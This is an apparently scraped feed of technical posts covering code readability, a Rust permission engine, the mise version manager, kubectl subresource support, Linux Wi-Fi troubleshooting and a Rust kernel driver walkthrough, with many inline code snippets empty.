The reason natural languages have polysemy is that relying on context takes  mental energy than communicating in verbose, fully-explicit phrases.</p><p>We can take advantage of this natural tendency in programming. If I’m working on a module that is implementing an HTTP client for the Stripe, I’m going to be fine using  to mean “send an authenticated HTTP GET request to Stripe”. But in a broader, less Stripe-specific context, I would want to write something like  instead.</p><p>Some of your code is the “meat” of your expression, the logic that matters for whatever you are doing. The rest is more like plumbing—code that we need to keep everything working but less significant in any  instance. Think of type conversions, control flow, error propagation, configuration management… Sometimes fixing a bug will hinge on how a specific config value flows into your function but, most of the time, you care far more about .</p><p>Quickly distinguishing plumbing code from logic is key for understanding and navigating code quickly. When you’re scanning through a codebase, you can ignore plumbing code altogether. I’ve found this is where certain “controversial” language features like macros, overloaded operators and control-flow abstractions.</p><p>As an example, using infix operators for plumbing constructs makes the plumbing visually distinct from “normal” identifiers while also giving your code some additional visual structure by naturally organizing the expression up into groups.</p><p>After a while, plumbing operators start to fade into the background when you’re scanning through code. Squint a bit, and you start seeing similarities between code that might be doing the same thing in different contexts. Consider the  operators in Haskell: they let us apply functions over values in some functor (like  and ) in a way that’s immediately reminiscent of normal function application:</p><div><pre><code></code></pre></div><p>This style also lets us see how operators naturally group code together:</p><div><pre><code></code></pre></div><p>Applicative notation might read like line noise to the uninitiated—and, honestly, it’s not exactly the best example of clean plumbing code—but, once you’re comfortable in Haskell, it just melts away. (Which is also 100% true of Lisp’s parentheses! Write enough Lisp and you stop seeing them. It is uncannily like the “I don’t see code” scene from .)</p><p>One perspective I’ve found useful is to think about the minimum amount of information an expression  contain. A polynomial in a single variable, for example, only really needs its coefficients. A web route needs the route, the methods it supports, any variables it takes and the variables’ types.</p><p>Anything else is unnecessary from a raw information point of view. We might still  additional code—for plumbing, for structure or just as an implementation detail—but, for thinking about API design, we want to be able to distinguish the core information the code is conveying from everything else. “Everything else” may be useful for organizing our code, but it might also be nothing more than unavoidable—or, depressingly often, completely unforced—boilerplate.</p><p><strong>Boilerplate makes code harder to read at a glance.</strong></p><p>As a general guide, I try to eliminate more and more of the inessential code as I repeat a particular kind of expression more and more. In extreme cases, a table layout might be the most readable option if you have a whole bunch of structured rows of code repeating.</p></div><section><p>Math notation—with its longer history of evolution and development than programming languages—is a great example of notation that can be read at a glance.</p><p>Compare the following two ways of writing the same expression:</p><p>This is an illustrative, if exaggerated, example.</p><p>Integral notation might be unfamiliar to a beginner, but it is wonderfully efficient. You can tell what the expression represents  thanks to the integral sign and the equation layout. Imagine squinting until you see the general outline of  integral expression—that’s the same principle I talk about as the “shape of the code”.</p><p>It’s easy to quickly identify parts of the equation to figure out what’s going on: the limits are distinct from the equation itself and distinct from the variable of integration (ie ). The polynomial itself continues the same theme:  as an operator gives structure to the polynomial, emphasizing its nature as a . In a sense, the  is just plumbing that gets out of our way so that we can identify the content  to this polynomial (namely the coefficients and degree).</p><p>The paragraph, on the other hand, has the advantage of being readable by anyone, even if they aren’t familiar with notation for integrals. But it has a fatal flaw: you  to read it. Every time. We have to read the text word-by-word to understand that it describes an integral and to see what the limits and function being integrated are. We can’t even tell that this is an integral of a polynomial without close reading!</p><p>If this paragraph were surrounded by other paragraphs, we wouldn’t be able to tell it apart from any other prose. I often start reading papers by skipping explanations and looking at figures and equations until I find what I need—I wouldn’t be able to do that without special notation and visual structure.</p></section><div><p>Good code is, ultimately, a human factors problem. We want to understand how people interact with code—how they read, write, skim, navigate, modify, reuse and repurpose code—and then write and organize our code in a style that makes these interactions as easy and natural as possible.</p><p>Writing code to be read at a glance is just part of the story, but it’s something I’ve found useful and important. Code I’ve written keeping this principle in mind just feels . And that, fuzzy as it sounds, makes a real, practical difference to how much time, energy and focus it takes to work on a codebase. Making code skimmable is nowhere near the most important aspect of making code pleasant and effective, but it does matter, and I have not seen people explicitly talking about it.</p><p>I don’t have much advice for putting these ideas into action. For me, just realizing that I valued code I could read at a glance and keeping that in mind when I wrote future code was all it took. I quickly developed the right habits and now I don’t have to think about it.</p></div>","contentLength":10838,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lnnbyc/code_is_skimmed_more_often_than_it_is_written_so/"},{"title":"[Media] I built “Decide” – a role and condition-based permission engine for Rust (and also JS/TS)","url":"https://www.reddit.com/r/rust/comments/1lnn6jt/media_i_built_decide_a_role_and_conditionbased/","date":1751225089,"author":"/u/aetheros_","guid":175427,"unread":true,"content":"<p>I recently released <a href=\"https://crates.io/crates/decide-core\">Decide</a>, a fast and lightweight permission engine written in Rust, with built-in support for both Rust and JavaScript/TypeScript.</p><p>It started as a small idea, but turned into something I genuinely found useful, especially because there weren’t many simple permission engines for Rust.</p><ul><li>Role + condition based permission engine</li><li>Supports conditions like: <code>user_id === resource_owner</code></li><li>Built in Rust (uses Rhai for condition evaluation)</li><li>Comes with a JS/TS wrapper (using napi-rs)</li></ul><p>The code is completely open to view. Visit the repository <a href=\"https://github.com/aether-flux/decide\">here</a>.</p><p>An example usage is given in the code snippet. The part  gets the role definitions from a  file.</p><p>There are a bunch of libraries for auth or RBAC in JS, but almost none in Rust. I thought, why not build a clean one that works for both?</p><p>It’s fully open-source and MIT licensed.</p><h2>Would love to hear your thoughts</h2><p>It's my first time posting here, and I'd love feedback. Especially around: - Rust conventions or improvements - Performance ideas</p><p>Thanks for reading, I hope this can help someone actually :)</p>","contentLength":1046,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"One click k8s deploy!","url":"https://www.reddit.com/r/kubernetes/comments/1lnn6i2/one_click_k8s_deploy/","date":1751225086,"author":"/u/wideboi_420","guid":175362,"unread":true,"content":"<p>Hello guys! I have been lurking around for a while, and I wanted to share my little automation project. I was a little bit inspired by Jim's Garage one click deploy script for k3s, but since I am studying k8s here is mine:</p><p>Please feel free to criticize and to give out any advice, this is just for fun, even tho someone might find this useful in the future =)</p>","contentLength":358,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is void linux in active development, and if so where on that scale?","url":"https://www.reddit.com/r/linux/comments/1lnme1y/is_void_linux_in_active_development_and_if_so/","date":1751223150,"author":"/u/doc1623","guid":175430,"unread":true,"content":"<p>I used it in the past, and loved it, but I remember reading that the lead or main developer left, I think. I see that it's still technically in active development but does that mean they are just barely keeping up or enough resources to make big advances, or somewhere in between. An example to make my point is Redox OS. It's initial release was 10 years ago. It still seems to be in \"active\" development, but it has yet to reach an official 1.0 release. Side note, I hope it does before it is surpassed by other projects with more developmental for me and I assume most at this point.</p><p>I guess, it's a multipart question or just lots of related questions.</p><ol><li><p>Why is it so far down on distrowatch list now?</p></li><li><p>Does it have enough active development resources to not only to keep pace with advancements, but even continue to make some or is too resource to be all but a fringe distro rather than a daily driver without allot of issues popping up that are more natural to developmental, pre-release version?</p></li></ol><p>Please, these are honest questions, that I don't feel I have the answer to. Please keep answers civil, non-defensive/combative. Hoping that people more \"in the know\" and/or have kept up better, might have a better understanding. </p>","contentLength":1225,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Service Binding for K8s in Spring Boot cloud-native applications","url":"https://medium.com/cloudnativepub/service-binding-for-k8s-in-spring-boot-cloud-native-applications-3717d3486886?sk=346dc534327888ca805aad94e5d0f1b5","date":1751222681,"author":"/u/zarinfam","guid":175359,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1lnm75f/service_binding_for_k8s_in_spring_boot/"},{"title":"Tools I love: mise(-en-place)","url":"https://blog.vbang.dk/2025/06/29/tools-i-love-mise/","date":1751221999,"author":"/u/micvbang","guid":176274,"unread":true,"content":"<p>Once in a while you get introduced to a tool that instantly changes the way you work. For me, <a href=\"https://github.com/jdx/mise\">mise</a> is one of those tools.</p><p>mise is the logical conclusion to a lot of the meta-tooling that exists around language-specific version and package managers like <a href=\"https://asdf-vm.com/\">asdf</a>, <a href=\"https://github.com/nvm-sh/nvm\">nvm</a>, <a href=\"https://docs.astral.sh/uv/\">uv</a>, <a href=\"https://github.com/pyenv/pyenv\">pyenv</a> etc. It makes it exceptionally easy to install, use, and manage software. It also allows you to manage <a href=\"https://mise.jdx.dev/environments/\">environment variables</a> and <a href=\"https://mise.jdx.dev/tasks/\">declare tasks</a> (run commands).</p><p>The first step in getting an intuitive understanding of what mise can help you with is to use it to install a tool. Pick your favorite and try it out; it supports <a href=\"https://mise.jdx.dev/registry.html\"></a>!</p><div><div><pre><code>jj\ncommand_not_found_handler:5: not found: jj\n\nmise use jj\nmise ~/projects/examples_mise/mise.toml tools: jj@0.30.0\n\njj version\njj 0.30.0\n\n ..\n\njj version\ncommand_not_found_handler:5: not found: jj\n\neaxmples_mise\n\njj version\njj 0.30.0\n</code></pre></div></div><p>As the above shows, with mise we’re just one command away from installing and trying out a new tool, e.g. .</p><p>In the above we that mise printed <code>mise ~/projects/examples_mise/mise.toml tools: jj@0.30.0</code>. This tells us that mise has created (or updated) the mise configuration . \nWe also see that if we cd out of , the  command is no longer available. If we cd back into , it becomes available again; unless you explicitly install tools globally, mise will only make the tools available which are mentioned in a  file on the path from your current directory to the root of your file system. That of course means that we could potentially meet multiple  files when going back up to the root of the file system. Mise handles this by concatting the configurations and overwriting conflicting configurations, letting the file furthest down the tree win.</p><p>This is a clever design as it allows us to configure different versions of the same tool to be available in different directories. Let’s have a look at what the  file looks like:</p><p>If we want a specific version of  to be installed in a specific directory, we just update the toml file to say e.g. .</p><p>Let’s see what it looks like to use mise to manage Python versions for two projects with different requirements:</p><div><div><pre><code>tree\n\n├── project_new\n│\t└── mise.toml\n└── project_old\n    └── mise.toml\n\nproject_new/mise.toml\ntools]\npython project_old/mise.toml\ntools]\npython project_new\npython \nPython 3.11.13\n\n ../project_old\npython \nPython 3.8.20\n</code></pre></div></div><p>When we cd into one of the directories listed above, mise automatically makes the version of the tool configured in  available to us. If it isn’t already installed, mise will install it for us. The implication of this is that you can commit a  to your repository, and anyone that has mise installed will automatically get and use the expected dev tools when they enter the project directory. And when it’s time to upgrade a dev tool, you can just update the version number in  and everyone will start using the new version!</p><p>The fact that mise makes tools available to you according to the  file in your current working directory has further implications: it’s not just developer machines that can benefit from using mise; CI/CD pipelines can benefit greatly as well! When you use mise in your pipelines, you avoid the problem of having out of sync versions between developer and build machines. You get to have a single place where you can configure the version of your dev tools everywhere!</p><p>As I mentioned in the beginning, besides managing dev tools, mise also allows you to <a href=\"https://mise.jdx.dev/tasks/toml-tasks.html\">declare and run so-called tasks</a>. Think of a task as an advanced invocation of a bash script. Even if we use tasks as just plain bash scripts (they can do a lot more), it can be a major advantage to declare common operations such as building, testing, linting etc. as mise tasks, since all developers get access to them and will run their commands in exactly the same way every time. If you’re diligent in your naming, you can even make the experience of building or testing across projects identical.</p><p>The following are examples of some very simple Python-related tasks declared in :</p><div><div><pre><code></code></pre></div></div><p>Adding this to  will make the commands  and  available. Again, if you check this in to your repo, the commands will be available to all developers and pipelines. And reusing these names in your rust project means that you can use the same commands to tell cargo to install your crates or run your tests.</p><p>Once you’ve declared your tasks you should of course also use them in your CI/CD pipeline. Doing this makes you less dependent on the particular yaml syntax and arbitrary requirements of your provider, and makes it easier to move to another one if you need to. It also ensures that there’s a standard way to build and test your code, helping to further reduce the amount of “it works on my machine”.</p><p>There’s a lot of depth to what you can use mise to help you automate. It’s a lovely tool and I hope I’ve spiked your interest enough to give it a try!</p><p>Although this is a very obvious problem, I want to make it explicit: a major concern of all software dependency management is control of your supply chain; how easy is it for somebody to insert malicious code into a binary you will run hugely impacts the integrity of your systems and data. Depending on your industry, it might not be feasible to use mise as it’s pretty opaque where your dependencies will be downloaded from.</p>","contentLength":5289,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lnlxds/tools_i_love_miseenplace/"},{"title":"KCSA 2nd attempt","url":"https://www.reddit.com/r/kubernetes/comments/1lnlijw/kcsa_2nd_attempt/","date":1751220964,"author":"/u/Low_Half_6876","guid":175361,"unread":true,"content":"<div><p>Hello I just want to know that in the KCSA 2ndt attempt will the question be same as the first attempt. Did anyone went through the second attempt of kcsa ?</p></div>   submitted by   <a href=\"https://www.reddit.com/user/Low_Half_6876\"> /u/Low_Half_6876 </a>","contentLength":192,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Klirr: invoice automation tool written on Rust using Typst","url":"https://www.reddit.com/r/rust/comments/1lnkpi7/klirr_invoice_automation_tool_written_on_rust/","date":1751219036,"author":"/u/Sajjon","guid":175461,"unread":true,"content":"<p>Features: * Config once: Set your company, client and project information using interactive Terminal UI (creates RON files). No Rust, Typst or RON skills needed! * Inter-month-idempotent: You build the invoice any number of times, it always results in the same invoice number when run within the same month. The proceeding month the next invoice number will be used. * Calendar aware: Using your machines system time to determine the month, it calculates the number of working days for the target month. Invoice date is set to last day of the target month and due date is set dependent on the payment terms set in your RON files. * Capable: Supports setting number of days you were off, to be extracted from the automatically calculated number of working days. Supports expenses using \"{PRODUCT}, {COST}, {CURRENCY}, {QUANTITY}, {DATE}\" CSV string. * Maintenance free: The invoice number automatically set based on the current month. When you build the invoice the next month, the next number is used * Multi-layout support: Currently only one layout is implemented, but the code base is prepared to very easily support more. * Multi-language support: The labels/headers are dynamically loaded through l18n - supported languages are English and Swedish - it is trivial for anyone to make a PR to add support for more languages.</p><p>Any and all feedback is much appreciated! Especially on ergonomics and features, but codebase well. </p><p>It has 97% test code coverage </p>","contentLength":1457,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Linux Lenovo issues with WIFI and Bluetooth after Updating","url":"https://www.reddit.com/r/linux/comments/1lnkpa3/linux_lenovo_issues_with_wifi_and_bluetooth_after/","date":1751219021,"author":"/u/Frequent-Price8935","guid":175310,"unread":true,"content":"<p>Hello guys, in the last months I got many issues after Updating my Linux System with WIFI and Bluetooth and I want to share my experience to help you out if u got the same issue. I personally found not much about this topic that could help me, therefore u got this to help.</p><p>I use  on a new <strong>Lenovo Thinkpad T14 Gen 5 AMD</strong></p><p>At fresh install and not after several months I faced the same Issue that after an update of the system WIFI und Bluetooth disappears. Only after I got in sleep Mode and login again just bluetooth shows up. After a restart nothing shows up again.</p><p>The issue was, that die BIOS got an Update as well. It seems Lenovo + Linux + Qualcomm got several issues after an BIOS Update.</p><p>To solve the issue in my case I got to the Lenovo Support site and downloaded the ISO File of the latest BIOS. This Version was two months older than the Version I got installed automatically. I flashed this to my USB and updated the BIOS to the older version. Now my WIFI and Bluetooth works again.</p><p>If u got the same issue and Google can´t help I hope u see this and maybe is solves your issue as well.</p>","contentLength":1094,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Native Subresource Support in Kubectl","url":"https://blog.abhimanyu-saharan.com/posts/native-subresource-support-in-kubectl","date":1751212336,"author":"/u/abhimanyu_saharan","guid":175227,"unread":true,"content":"<p>Managing Kubernetes subresources like  and  has traditionally been clunky for CLI users. Until recently, interacting with these required raw HTTP calls or complex  invocations, making operations difficult to script and error-prone. With the graduation of <a href=\"https://github.com/kubernetes/enhancements/tree/master/keps/sig-cli/2590-kubectl-subresource-support\">KEP-2590</a> to stable in Kubernetes v1.33, users now have native support for subresource manipulation directly within .</p><p>The Kubernetes API defines  such as , , and  to isolate specific update operations. These endpoints are commonly used by controllers, but until now, human users had no clean way to interact with them using kubectl. For example:</p><ul><li>Fetching the current status of a deployment required querying the full object or making raw HTTP requests.</li><li>Updating replica counts through the  subresource was either not possible via  or required complex scripting.</li><li>CustomResourceDefinitions (CRDs) with subresources were even more tedious to handle.</li></ul><p>This KEP introduces a  flag across key kubectl commands, streamlining these workflows.</p><h2>New Capability:  Flag<a href=\"https://blog.abhimanyu-saharan.com/posts/native-subresource-support-in-kubectl#new-capability-subresource-flag\"></a></h2><p>You can now use the  flag with the following commands:</p><ul></ul><p>This change enables consistent and declarative interaction with subresources for both built-in and custom resource types.</p><h3>Example: Get Deployment Status or Scale<a href=\"https://blog.abhimanyu-saharan.com/posts/native-subresource-support-in-kubectl#example-get-deployment-status-or-scale\"></a></h3><h3>Example: Patch Subresource<a href=\"https://blog.abhimanyu-saharan.com/posts/native-subresource-support-in-kubectl#example-patch-subresource\"></a></h3><p>This is particularly powerful for CRDs that expose scale or status endpoints.</p><h3>Behavior for Unsupported Subresources<a href=\"https://blog.abhimanyu-saharan.com/posts/native-subresource-support-in-kubectl#behavior-for-unsupported-subresources\"></a></h3><p>The CLI includes input validation and proper error handling:</p><p>The enhancement builds on the resource builder and visitor pattern already in use within , adding a  chain to target the correct API path. Table printer support was extended to pretty-print responses from  and  subresources, ensuring consistency in output formatting.</p><ul><li> output reuses  defined in the CRD spec.</li><li> output mimics native resources by adding desired/available replicas.</li></ul><ul><li>: Introduced in Kubernetes v1.25 with initial support for , , , and .</li><li>: Promoted in v1.27 with  support and e2e coverage.</li><li>: Graduated in v1.33 after over a year of stable usage with no critical issues.</li></ul><ul><li>The enhancement is entirely client-side.</li><li>Users on older  binaries will simply not see the flag.</li><li>The API behavior remains unchanged, so operations can still be performed using  as before.</li></ul><p>Cluster admins can track usage by inspecting audit logs for subresource API requests, particularly those hitting , , or .</p><p>This enhancement significantly improves the developer experience when managing Kubernetes objects via . By exposing subresources as first-class citizens, it simplifies scripting, debugging, and day-to-day cluster operations. Whether you're scaling CRDs, inspecting status updates, or editing a subset of object fields,  brings much-needed ergonomics to Kubernetes CLI workflows.</p><p>If you're using custom controllers or automation pipelines that rely on subresources, it's time to update your toolchains and start leveraging this feature natively through .</p>","contentLength":2849,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1lnhztk/native_subresource_support_in_kubectl/"},{"title":"Ilya Sutskever says future superintelligent data centers are a new form of \"non-human life\". He's working on superalignment: \"We want those data centers to hold warm and positive feelings towards people, towards humanity.\"","url":"https://v.redd.it/46bejt6qyv9f1","date":1751211451,"author":"/u/MetaKnowing","guid":175309,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lnhn34/ilya_sutskever_says_future_superintelligent_data/"},{"title":"How to write Rust in the Linux kernel, part 2","url":"https://lwn.net/SubscriberLink/1025232/fbb2d90d084368e3/","date":1751210673,"author":"/u/kibwen","guid":175364,"unread":true,"content":"<blockquote><table><tbody><tr><td><p>\nThe following subscription-only content has been made available to you \nby an LWN subscriber.  Thousands of subscribers depend on LWN for the \nbest news from the Linux and free software communities.  If you enjoy this \narticle, please consider <a href=\"https://lwn.net/subscribe/\">subscribing to LWN</a>.  Thank you\nfor visiting LWN.net!\n</p></td></tr></tbody></table></blockquote><p>\nIn 2023, Fujita Tomonori\n<a href=\"https://lwn.net/ml/all/20231012125349.2702474-5-fujita.tomonori@gmail.com/\">\nwrote a Rust version</a> of the existing driver for the\nAsix AX88796B embedded Ethernet controller. At slightly more than 100 lines,\nit's about as simple as a driver can be, and therefore is a useful touchstone for\nthe differences between writing Rust and C in the kernel. Looking at the Rust\nsyntax, types, and APIs used by the driver and contrasting them with the C\nversion will help illustrate those differences.\n</p><p>\nReaders who are already conversant with Rust may find this article retreads some\nbasics, but it is my hope that it can still serve as a useful reference for\nimplementing simple drivers in Rust. The\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/drivers/net/phy/ax88796b.c\">\nC version</a> and the\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/drivers/net/phy/ax88796b_rust.rs\">\nRust version</a> of the AX88796B driver are remarkably similar, but there are still some important\ndifferences that could trip up a developer performing a naive rewrite from one to the other.\n</p><p>\nThe least-different thing between the two versions is the legalities. The Rust\ndriver starts with an\n<a href=\"https://docs.kernel.org/process/license-rules.html\">\nSPDX comment</a> asserting that the file is covered by the GPL,\nas many files in the kernel do. Below that is a documentation comment:\n</p><pre>    //! Rust Asix PHYs driver\n    //!\n    //! C version of this driver: [`drivers/net/phy/ax88796b.c`](./ax88796b.c)\n</pre><p>\nAs mentioned in the\n<a href=\"https://lwn.net/Articles/1024202/\">\nprevious article</a>, comments starting with  contain documentation that applies\nto the\nentire file. The next few lines are a  statement, the Rust analogue\nof :\n</p><pre>    use kernel::{\n        c_str,\n        net::phy::{self, reg::C22, DeviceId, Driver},\n        prelude::*,\n        uapi,\n    };\n</pre><p>\nLike C, Rust modules are located starting from a search path and then continuing\ndown a directory tree. Unlike C, a  statement can selectively import\nonly some items defined in a module. For example,  is not a separate module,\nbut rather a specific item inside the\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/rust/kernel/net/phy.rs\"></a> module. By\nimporting both  and \nas a whole, the Rust module can refer to  directly, and\nanything else from the PHY module as . These items can always\nbe referred to by their full paths; a  statement just introduces a\nshorter local alias. If a name would be ambiguous, the compiler will complain.\n</p><p>\nAll of these imported items come from the  crate (Rust library),\nwhich contains the bindings between the main kernel and Rust code. In a\nuser-space Rust project, a program would usually also have some imports from\n, Rust's standard library, but that isn't possible in the kernel,\nsince the kernel needs more precise control over allocation and other details\nthat the standard library abstracts away. Kernel C developers can't use\nfunctions from libc in the kernel for much the same reason. The\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/rust/kernel/prelude.rs\"> module</a> contains kernel replacements for many common\nstandard-library functions; the remainder can be found in , the\nsubset of  that doesn't allocate.\n</p><p>\nIn the C version of the driver, the next step is to define some constants\nrepresenting the three different, but related, devices this driver supports: the\nAX88772A, the AX88772C, and the AX88796B. In Rust, items do not have to be\ndeclared before use — the entire file is considered at once. Therefore, Fujita\nchose to reorder things slightly to keep the code for each board in its own\nsection; the types for each board ( and so on) are defined\nlater.\nThe next part of the Rust driver is a macro invocation that sets up the\nnecessary symbols for a PHY driver:\n</p><pre>    kernel::module_phy_driver! {\n        drivers: [PhyAX88772A, PhyAX88772C, PhyAX88796B],\n        device_table: [\n            DeviceId::new_with_driver::&lt;PhyAX88772A&gt;(),\n            DeviceId::new_with_driver::&lt;PhyAX88772C&gt;(),\n            DeviceId::new_with_driver::&lt;PhyAX88796B&gt;()\n        ],\n        name: \"rust_asix_phy\",\n        authors: [\"FUJITA Tomonori &lt;fujita.tomonori@gmail.com&gt;\"],\n        description: \"Rust Asix PHYs driver\",\n        license: \"GPL\",\n    }\n</pre><p>\nRust macros come in two general kinds: attribute macros, which are written\n and modify the item that they appear before, and normal\nmacros, which are written . There is also a less common\nvariant of attribute macros written  which applies to the\ndefinition that they appear within. Normal macros can use any\nmatching set of braces to enclose their arguments, but can always be recognized\nby the mandatory exclamation mark between the name and the braces.\nThe convention is to use\nparentheses for macros that return a value and braces for macros that are\ninvoked to define a structure (as is the case here), but that is not actually\nrequired. Invoking the macro with parentheses would have the same result, but it\nwould make it less obvious to other Rust programmers what is happening.\n</p><p>\nThe  argument to the macro contains the names of the three board\ntypes this driver covers. Each driver has to be associated with information such\nas the name of the device and the PHY device ID that it should be active for. In\nthe C version of the driver, this is handled by a separate table:\n</p><pre>    static struct phy_driver asix_driver[] = { ... };\n</pre><p>\nIn the Rust code, this information is stored in the code for each board (see\nbelow), since\nall PHY drivers need to provide it. Overall, the\n macro serves the same role as the\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/include/linux/phy.h#L2126\"></a> macro in C.\n</p><p>\nNext, the Rust driver defines two constants that the code uses later:\n</p><pre>    const BMCR_SPEED100: u16 = uapi::BMCR_SPEED100 as u16;\n    const BMCR_FULLDPLX: u16 = uapi::BMCR_FULLDPLX as u16;\n</pre><p>\nEvery declaration of a value (as opposed to a data structure) in Rust starts\nwith either  or . The former are compile-time\nconstants — like a simple  in C. Types are mandatory for\n definitions, but optional for  ones. In either case,\nthe type always appears separated from the name by a colon.\nSo, in this case, both constants are\n values, Rust's unsigned 16-bit integer type. The \npart at the end is a cast, since the original  constants\nbeing referenced are defined in C and assumed to be 32 or 64 bits by default,\ndepending on the platform.\n</p><p>\nThe final piece of code before the actual drivers is a shared function for\nperforming a soft reset on Asix PHYs:\n</p><pre>    // Performs a software PHY reset using the standard\n    // BMCR_RESET bit and poll for the reset bit to be cleared.\n    // Toggle BMCR_RESET bit off to accommodate broken AX8796B\n    // PHY implementation such as used on the Individual\n    // Computers' X-Surf 100 Zorro card.\n    fn asix_soft_reset(dev: &amp;mut phy::Device) -&gt; Result {\n        dev.write(C22::BMCR, 0)?;\n        dev.genphy_soft_reset()\n    }\n</pre><p>\nThere's a few things to notice about this function. First of all, the comment\nabove it is not a documentation comment. This isn't a problem because this\nfunction is also private — since it was declared with  instead of\n, it's not visible outside this one module. The C equivalent\nwould be a  function. In Rust, the default is the opposite way around,\nwith functions being private (static) unless declared otherwise.\n</p><p>\nThe argument to the function is an  called .\nReferences (written with an &amp;)\nare in many ways Rust's most prominent feature; they are like\npointers, but with compile-time guarantees that certain classes of bugs (such as\nconcurrent mutable access without synchronization) can't happen. In this case,\n takes a mutable reference (). The\ncompiler guarantees that no other function can have a reference to the\nsame\n<a href=\"https://rust.docs.kernel.org/kernel/net/phy/struct.Device.html\"></a> at the same time. This means that the body of the\nfunction can clear the  pin and trigger a soft reset without\nworrying about concurrent interference.\n</p><p>\nThe last part of the function to understand is the return type,\n<a href=\"https://rust.docs.kernel.org/kernel/error/type.Result.html\"></a>, and the \"try\" operator, . In C, a function that could fail often\nindicates this by returning a special sentinel value, typically a negative number.\nIn Rust, the same thing is true, but the sentinel value is called \ninstead, and is one possible value of the  enumeration. The other\nvalue is , which indicates success. Both  and \ncan carry additional information, but the default in the kernel is for  to carry an\n<a href=\"https://rust.docs.kernel.org/kernel/error/struct.Error.html\">\nerror number</a>, and for  to have no additional information.\n</p><p>\nThe pattern of checking for an error and then immediately propagating it to a\nfunction's caller is so common that Rust introduced the try operator as a\nshortcut. Consider the same function from the C version of the driver:\n</p><pre>    static int asix_soft_reset(struct phy_device *phydev)\n    {\n\t    int ret;\n\n\t    /* Asix PHY won't reset unless reset bit toggles */\n\t    ret = phy_write(phydev, MII_BMCR, 0);\n\t    if (ret &lt; 0)\n\t\t    return ret;\n\n\t    return genphy_soft_reset(phydev);\n    }\n</pre><p>\nIt performs the same two potentially fallible library function calls, but needs\nan extra statement to propagate the potential error. In the Rust version, if the\nfirst call returns an , the try operator automatically returns it.\nFor the second call, note how the line does not end with a semicolon — this\nmeans the value of the function call is also the return value of the function as\na whole, and therefore any errors will also be returned to the caller. The\nmissing semicolon is not easy to forget, however, because adding it in will make\nthe compiler complain that the function does not return a .\n</p><p>\nThe actual driver code differs slightly for the three different boards. The\nsimplest is the AX88786B, the implementation of which starts on\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/drivers/net/phy/ax88796b_rust.rs#L124\">\nline 124</a>:\n</p><p>\nThis is an empty structure. An actual instance of this type has no storage\nassociated with it — it doesn't take up space in other structures,\n<a href=\"https://doc.rust-lang.org/std/mem/fn.size_of.html\"></a> reports 0, and it has no padding — but there can still be\nglobal data for the type as a whole (such as debugging information). In this\ncase, an empty structure is used to implement the  abstraction,\nin order to bundle all of the needed data and functions for a PHY driver\ntogether. When the compiler is asked to produce functions that apply to a\n (which the  macro does), it\nwill use this definition:\n</p><pre>    #[vtable]\n    impl Driver for PhyAX88796B {\n        const NAME: &amp;'static CStr = c_str!(\"Asix Electronics AX88796B\");\n        const PHY_DEVICE_ID: DeviceId =\n            DeviceId::new_with_model_mask(0x003b1841);\n\n        fn soft_reset(dev: &amp;mut phy::Device) -&gt; Result {\n            asix_soft_reset(dev)\n        }\n    }\n</pre><p>\nThe constant and function definitions work in the same way as above. The type of\n uses a static reference (\"\"), which is\na reference\nthat is valid for the entire lifetime of the program. The C equivalent is a\n pointer to the data section of the executable: it is never\nallocated, freed, or modified, and is therefore fine to dereference anywhere in\nthe program.\n</p><p>\nThe new\nRust feature in this part of the driver is the  block, which is used to implement a\n<a href=\"https://doc.rust-lang.org/book/ch10-02-traits.html#traits-defining-shared-behavior\">\ntrait</a>. Often, a program will have multiple different parts that conform to\nthe same interface. For example, all PHY drivers need to provide a name,\nassociated device ID, and some functions implementing driver operations.\nIn Rust, this kind of common interface is represented by a\ntrait, which lets the compiler perform static type dispatch to select the right\nimplementation based on how the trait functions are called.\n</p><p>\nC, of course, does not work like this (although\n<a href=\"https://en.cppreference.com/w/c/language/generic.html\"></a> can sometimes\nbe used to implement type dispatch manually). In the kernel's C code, PHY drivers are\nrepresented by\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/include/linux/phy.h#L876\">\na structure</a> that contains data and function pointers. The\n macro converts a Rust trait into a singular C structure full of\nfunction pointers. Up above, in the call to , the\nreference to the  type lets the compiler find the right\n implementation, and from there produce the correct C structure\nto integrate with the C PHY driver infrastructure.\n</p><p>\nThere are obviously more functions involved in implementing a complete PHY\ndriver. Luckily, these functions are often the same between different devices,\nbecause there is a standard interface for PHY devices. The C PHY driver code\nwill fall back to a generic implementation if a more specific function isn't\npresent in the driver's definition, so the AX88796B code can leave them out.\nThe other two devices supported in this driver\nspecify more custom functions to work around hardware quirks, but those\nfunctions are not much more complicated than what has already been shown.\n</p><p>\nSteps to implement a PHY driver ...\n</p><table><tbody><tr><td valign=\"top\">Write module boilerplate (licensing and authorship information,\n statements, etc.).</td><td valign=\"top\">Write module boilerplate (licensing and authorship information, \nstatements, a call to ).</td></tr><tr><td valign=\"top\">Implement the needed functions for the driver, skipping functions that can\nuse the generic PHY code.\n</td><td valign=\"top\">Implement the needed functions for the driver, skipping functions that can\nuse the generic PHY code.\n</td></tr><tr><td valign=\"top\">Bundle the functions along with a name, optional flags, and PHY device ID\ninto a  and register it with the PHY subsystem.\n</td><td valign=\"top\">Bundle the functions along with a name, optional flags, and PHY device ID\ninto a trait; the  macro converts it into the right form for\nthe 